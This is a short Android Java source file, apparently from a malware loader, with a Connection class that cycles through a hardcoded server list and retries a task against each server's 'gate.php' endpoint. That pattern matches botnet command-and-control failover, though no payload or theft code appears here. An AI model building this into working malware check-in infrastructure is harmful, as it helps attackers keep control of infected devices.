package task.loader;

import android.content.Context;

public class Connection
{
    private Context context;
    private Settings settings;
    private ConnectionTask task;

    public Connection(Context context, ConnectionTask task)
    {

        this.context = context;
        this.settings = Settings.getInstance(context);
        this.task = task;
    }

    public void start()
    {
        int serverIndex = Constants.SERVERS.indexOf(settings.getServer());


        for(int i = 0; i < Constants.SERVERS.size(); i++)
        {
            if(Constants.DEBUG) Settings.debug("i: " + i);
            if(Constants.DEBUG) Settings.debug("serverIndex: " + serverIndex);

            for (int j = 0; j < Constants.SERVER_TRY_COUNT; j++)
            {
                if(Constants.DEBUG) Settings.debug("j: " + j);

                if (task.run(context, settings)) return;
            }

            ++serverIndex;
            if(serverIndex == Constants.SERVERS.size()) serverIndex = 0;
            settings.setServer(Constants.SERVERS.get(serverIndex) + "gate.php");
        }
    }




}
